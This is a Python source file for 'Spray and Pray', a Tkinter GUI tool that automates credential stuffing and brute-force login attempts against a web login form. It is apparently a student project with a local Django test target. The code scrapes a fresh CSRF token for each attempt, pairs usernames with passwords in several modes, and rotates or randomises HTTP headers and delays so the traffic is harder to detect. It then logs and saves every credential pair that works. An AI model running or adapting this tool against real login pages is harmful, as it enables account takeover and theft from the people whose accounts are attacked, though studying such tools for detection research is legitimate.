import os
import sys
import csv
import random
import requests
import datetime
import itertools
import threading
import subprocess
from tkinter import *
from tkinter import ttk
from tkinter import filedialog, messagebox
from tkinter import Tk, Button, DISABLED, NORMAL
from tkinter import Toplevel, Text, Scrollbar, END
from bs4 import BeautifulSoup
from random import uniform
from time import sleep

# Global variables and initial settings
global is_cancelled, attempt_count, successful_attempts, unsuccessful_attempts, successful_logins, tree
is_cancelled = False  # This flag will be used to stop the login process
successful_logins = []  # This list will keep track of successful login attempts
tree = None  # This will be the Treeview widget for displaying successful logins
progress = None  # This will be the Progressbar widget
root = None  # This will be the main Tkinter window

# Predefined values for the entry fields
default_url = "http://127.0.0.1:8000/login/"
default_usernames_path = "/home/parrot/fyp/fds/sap/resources/usernames.txt"
default_passwords_path = "/home/parrot/fyp/fds/sap/resources/passwords.txt"
default_headers_path = "/home/parrot/fyp/fds/sap/resources/headers.csv"
default_delay = "0"

def cancel_run():
    global is_cancelled
    is_cancelled = True
    root.after(0, lambda: start_button.config(state=NORMAL))
    root.after(0, lambda: cancel_button.config(state=DISABLED))

def get_csrf_token(session, login_page_url):
    """Fetches a new CSRF token from the login page for each attempt."""
    response = session.get(login_page_url)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find('input', {'name': 'csrfmiddlewaretoken'})['value']
    return csrf_token

def attempt_login(session, login_url, username, password, headers):
    """Attempts to log in using the provided credentials and headers."""
    # Prepare the data for the POST request
    data = {
        'username': username,
        'password': password,
        'csrfmiddlewaretoken': headers['X-CSRFToken']
    }

    print(f"{headers}")

    # Make the login attempt with the POST request
    response = session.post(login_url, headers=headers, data=data)

    # Check the response to determine if the login was successful
    if "Welcome to the Home Page" in response.text:
        print(f"Successful login with {username}:{password}")
        return True
    else:
        print(f"Failed login with {username}:{password}")
        return False

def read_header_values(csv_path):
    """Reads header values from a CSV file and returns them as a list of dictionaries."""
    header_values_list = []
    with open(csv_path, newline='') as csvfile:
        reader = csv.DictReader(csvfile)
        for row in reader:
            header_values_list.append(row)
    return header_values_list

def read_lines_from_file(file_path):
    """Reads lines from a file and returns them as a list."""
    with open(file_path) as f:
        lines = f.read().splitlines()
    return lines

def set_headers(header_mode, header_values_list, username, usernames):
    headers = {}
    if header_mode == "uniform_headers":
        headers = header_values_list[0].copy()
    elif header_mode == "random_headers_each_request":
        headers = random.choice(header_values_list).copy()
    elif header_mode == "randomize_each_header":
        for field in header_values_list[0]:
            headers[field] = random.choice([row[field] for row in header_values_list])
    elif header_mode == "unique_headers_per_username":
        index = usernames.index(username) % len(header_values_list)
        headers = header_values_list[index].copy()
    return headers

def execute_login(header_mode, target_url, usernames, passwords, header_values_list):
    global is_cancelled  # Add this line to declare is_cancelled as global
    session = requests.Session()
    successful_logins = []
    attempt_count = 0
    successful_attempts = 0
    unsuccessful_attempts = 0

    # Initialize the table for successful attempts
    tree = ttk.Treeview(root, columns=('Username', 'Password'), show="headings")
    tree.heading('Username', text='Username')
    tree.heading('Password', text='Password')
    tree.grid(row=12, column=0, sticky='nsew', pady=10)

    # Determine credential pairs based on the selected iteration mode
    iteration_mode = iteration_mode_var.get()
    if iteration_mode == "stuffing_mode":
        # Pair each username with the corresponding password (stuffing mode)
        min_length = min(len(usernames), len(passwords))
        credential_pairs = [(usernames[i], passwords[i]) for i in range(min_length)]
    elif iteration_mode == "systematic_order":
        # Systematic order without randomization
        credential_pairs = list(itertools.product(usernames, passwords))
    else:  # Default to random order
        # Randomize the order of credential pairs
        credential_pairs = list(itertools.product(usernames, passwords))
        random.shuffle(credential_pairs)

    total_attempts = len(credential_pairs)
    progress['maximum'] = total_attempts

    for username, password in credential_pairs:
        if is_cancelled:
            break

        csrf_token = get_csrf_token(session, target_url)
        headers = set_headers(header_mode, header_values_list, username, usernames)
        headers['X-CSRFToken'] = csrf_token
        success = attempt_login(session, target_url, username, password, headers)

        attempt_count += 1
        progress['value'] = attempt_count
        root.update_idletasks()

        if success:
            successful_attempts += 1
            successful_logins.append((username, password))
            tree.insert('', 'end', values=(username, password))
        else:
            unsuccessful_attempts += 1

        # Delay between attempts
        try:
            min_delay = float(min_delay_entry.get())
            max_delay = float(max_delay_entry.get())
            delay = uniform(min_delay, max_delay)
            sleep(delay)
        except ValueError:
            messagebox.showerror("Invalid Delay", "Please enter valid numbers for min and max delay.")
            return
    if is_cancelled:
        messagebox.showinfo("Cancelled", f"{attempt_count} login attempts completed.\n"
                                          f"Successful attempts: {successful_attempts}\n"
                                          f"Unsuccessful attempts: {unsuccessful_attempts}")        
        is_cancelled = False
    else:
        messagebox.showinfo("Completed", f"All {attempt_count} login attempts completed.\n"
                                          f"Successful attempts: {successful_attempts}\n"
                                          f"Unsuccessful attempts: {unsuccessful_attempts}")
    progress['value'] = 0
    root.after(0, lambda: start_button.config(state=NORMAL))

def setup_treeview():
    global tree
    # Initialize the Treeview widget if it hasn't been already
    tree = ttk.Treeview(root, columns=('Username', 'Password'), show="headings")
    tree.heading('Username', text='Username')
    tree.heading('Password', text='Password')
    tree.grid(row=12, column=0, sticky='nsew', pady=10)

def save_successful_attempts(target_url, successful_logins, header_values_list, usernames, passwords):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"results/session_{timestamp}.txt"
    os.makedirs(os.path.dirname(filename), exist_ok=True)

    with open(filename, 'w') as f:
        f.write(f"Target URL: {target_url}\n")
        f.write(f"Total Attempts: {attempt_count}\n")
        if successful_logins:
            for username, password in successful_logins:
                f.write(f"Timestamp: {timestamp}\n")
                f.write(f"Username: {username}, Password: {password}\n\n")
        else:
            f.write("No successful logins.")

def on_start():
    global header_mode, target_url, usernames, passwords, header_values_list, is_cancelled, attempt_count, successful_attempts, unsuccessful_attempts, successful_logins
    
    # Get inputs from GUI and initialize variables
    header_mode = header_var.get()
    target_url = url_entry.get()
    usernames_path = usernames_entry.get()
    passwords_path = passwords_entry.get()
    csv_path = headers_entry.get()

    usernames = read_lines_from_file(usernames_path)
    passwords = read_lines_from_file(passwords_path)
    header_values_list = read_header_values(csv_path)

    is_cancelled = False
    attempt_count = 0
    successful_attempts = 0
    unsuccessful_attempts = 0
    successful_logins = []

    # Clear any existing entries in the results treeview
    setup_treeview()
    tree.delete(*tree.get_children())

    # Change button states
    start_button.config(state=DISABLED)
    cancel_button.config(state=NORMAL)

    # Start the login attempts in a separate thread
    threading.Thread(target=execute_login, args=(header_mode, target_url, usernames, passwords, header_values_list)).start()

# Function to handle file selection
def select_file(entry):
    file_path = filedialog.askopenfilename()
    entry.delete(0, END)
    entry.insert(0, file_path)

def clear_fields():
    url_entry.delete(0, END)
    usernames_entry.delete(0, END)
    passwords_entry.delete(0, END)
    headers_entry.delete(0, END)
    progress['value'] = 0

def reload_script():
    python = sys.executable
    os.execl(python, python, *sys.argv)
    
def show_help():
    # Create a new top-level window
    help_window = Toplevel(root)
    help_window.title("Help")
    
    # Create a Text widget and a Scrollbar
    text = Text(help_window, wrap="word", exportselection=0)
    scrollbar = Scrollbar(help_window, command=text.yview)
    text.configure(yscrollcommand=scrollbar.set)
    
    # Grid the Text widget and Scrollbar
    text.grid(row=0, column=0, sticky="nsew")
    scrollbar.grid(row=0, column=1, sticky="ns")
    
    # Configure grid layout for resizing
    help_window.grid_rowconfigure(0, weight=1)
    help_window.grid_columnconfigure(0, weight=1)
    
    # Read the help content from the file and insert into the Text widget
    try:
        with open('help.md', 'r') as file:
            help_content = file.read()
            text.insert(END, help_content)
            text.configure(state="disabled")  # Make the Text widget read-only
    except Exception as e:
        text.insert(END, f"Failed to open help file: {str(e)}")
        text.configure(state="disabled")

def edit_usernames():
    subprocess.call(['xdg-open', os.path.join('resources', 'usernames.txt')])

def edit_passwords():
    subprocess.call(['xdg-open', os.path.join('resources', 'passwords.txt')])

def edit_headers():
    subprocess.call(['xdg-open', os.path.join('resources', 'headers.csv')])

def open_users_table():
    subprocess.call(['xdg-open', os.path.join('resources', 'users.ods')])
        
# Initialize the GUI application
root = Tk()
root.title("Spray and Pray")

# Menu bar with Help section
menu_bar = Menu(root)
root.config(menu=menu_bar)

file_menu = Menu(menu_bar, tearoff=0)
menu_bar.add_cascade(label="File", menu=file_menu)
file_menu.add_command(label="New", command=clear_fields)
file_menu.add_command(label="Reload", command=reload_script)
file_menu.add_command(label="Exit", command=root.destroy)

edit_menu = Menu(menu_bar, tearoff=0)
menu_bar.add_cascade(label="Edit", menu=edit_menu)
edit_menu.add_command(label="Edit Username List", command=edit_usernames)
edit_menu.add_command(label="Edit Password List", command=edit_passwords)
edit_menu.add_command(label="Edit Header List", command=edit_headers)
edit_menu.add_separator()  # Optional: Adds a separator line in the menu
edit_menu.add_command(label="Open Users Table", command=open_users_table)

help_menu = Menu(menu_bar, tearoff=0)
menu_bar.add_cascade(label="Help", menu=help_menu)
help_menu.add_command(label="Help", command=show_help)
help_menu.add_command(label="About", command=lambda: messagebox.showinfo("About", "Spray and Pray\nVersion 1.0"))

# Input Frame for URL, usernames, passwords, and headers
input_frame = ttk.Frame(root)
input_frame.grid(pady=10)

# URL entry
url_label = ttk.Label(input_frame, text="Target URL:")
url_label.grid(row=0, column=0, sticky=W)
url_entry = ttk.Entry(input_frame, width=70)
url_entry.grid(row=0, column=1, columnspan=2, padx=5, pady=5, sticky=W)
url_entry.insert(0, default_url)

# Usernames file entry
usernames_label = ttk.Label(input_frame, text="Usernames File:")
usernames_label.grid(row=1, column=0, sticky=W)
usernames_entry = ttk.Entry(input_frame, width=50)
usernames_entry.grid(row=1, column=1, padx=5, pady=5)
usernames_entry.insert(0, default_usernames_path)
usernames_btn = ttk.Button(input_frame, text="Browse", command=lambda: select_file(usernames_entry))
usernames_btn.grid(row=1, column=2, padx=5, pady=5, sticky=W)

# Passwords file entry
passwords_label = ttk.Label(input_frame, text="Passwords File:")
passwords_label.grid(row=2, column=0, sticky=W)
passwords_entry = ttk.Entry(input_frame, width=50)
passwords_entry.grid(row=2, column=1, padx=5, pady=5)
passwords_entry.insert(0, default_passwords_path)
passwords_btn = ttk.Button(input_frame, text="Browse", command=lambda: select_file(passwords_entry))
passwords_btn.grid(row=2, column=2, padx=5, pady=5, sticky=W)

# Headers CSV file entry
headers_label = ttk.Label(input_frame, text="Headers CSV File:")
headers_label.grid(row=3, column=0, sticky=W)
headers_entry = ttk.Entry(input_frame, width=50)
headers_entry.grid(row=3, column=1, padx=5, pady=5)
headers_entry.insert(0, default_headers_path)
headers_btn = ttk.Button(input_frame, text="Browse", command=lambda: select_file(headers_entry))
headers_btn.grid(row=3, column=2, padx=5, pady=5, sticky=W)

# Control Frame for options and buttons
control_frame = ttk.Frame(root)
control_frame.grid(pady=5)

# Iteration mode selection
iteration_mode_var = StringVar(value="stuffing_mode")
iteration_modes = [
    ("Stuffing", "stuffing_mode"),
    ("Random", "random_order"),
    ("Systematic", "systematic_order"),
]
mode_label = ttk.Label(control_frame, text="Iteration Mode", font="bold")
mode_label.grid(row=4, column=0, sticky=W, pady=10, padx=10)
for i, (text, mode) in enumerate(iteration_modes, 5):
    ttk.Radiobutton(control_frame, text=text, variable=iteration_mode_var, value=mode).grid(row=i, column=0, sticky=W, padx=10)

# Header customization mode selection
header_var = StringVar(value="uniform_headers")
modes = [
    ("Uniform Headers for All Requests", "uniform_headers"),
    ("Random Headers for Each Request", "random_headers_each_request"),
    ("Randomize Each Header Value Individually", "randomize_each_header"),
    ("Unique Headers per Username", "unique_headers_per_username"),
]
mode_label = ttk.Label(control_frame, text="Header Customization Mode" , font="bold")
mode_label.grid(row=4, column=1, sticky=W, pady=10, padx=10)
for i, (text, mode) in enumerate(modes, 5):
    ttk.Radiobutton(control_frame, text=text, variable=header_var, value=mode).grid(row=i, column=1, sticky=W, padx=10)

# Minimum and maximum delay entry
delay_title_label = ttk.Label(control_frame, text='Attempt delay', font="bold")
delay_title_label.grid(row=4, column=2, sticky=W, pady=10, padx=10)

min_delay_label = ttk.Label(control_frame, text="Min Delay (s):")
min_delay_label.grid(row=5, column=2, sticky=W, padx=10)
min_delay_entry = ttk.Entry(control_frame, width=10)
min_delay_entry.grid(row=6, column=2, sticky=W, padx=10)
min_delay_entry.insert(0, default_delay)

max_delay_label = ttk.Label(control_frame, text="Max Delay (s):")
max_delay_label.grid(row=7, column=2, sticky=W, padx=10)
max_delay_entry = ttk.Entry(control_frame, width=10)
max_delay_entry.grid(row=8, column=2, sticky=W, padx=10)
max_delay_entry.insert(0, default_delay)

# Start button
start_button = ttk.Button(control_frame, text="Start", command=on_start)
start_button.grid(row=9, column=1, pady=5, padx=50, sticky=W+E)

# Cancel button
cancel_button = ttk.Button(control_frame, text="Cancel", command=cancel_run)
cancel_button.grid(row=10, column=1, pady=5, padx=50, sticky=W+E)

# Create the progress bar in your GUI setup
progress = ttk.Progressbar(root, orient=HORIZONTAL, length=800, mode='determinate')
progress.grid(row=11, column=0, pady=10)

# Ensures the window cannot be resized smaller than the widgets' required spaces
root.update()
root.minsize(root.winfo_width(), root.winfo_height())
root.mainloop()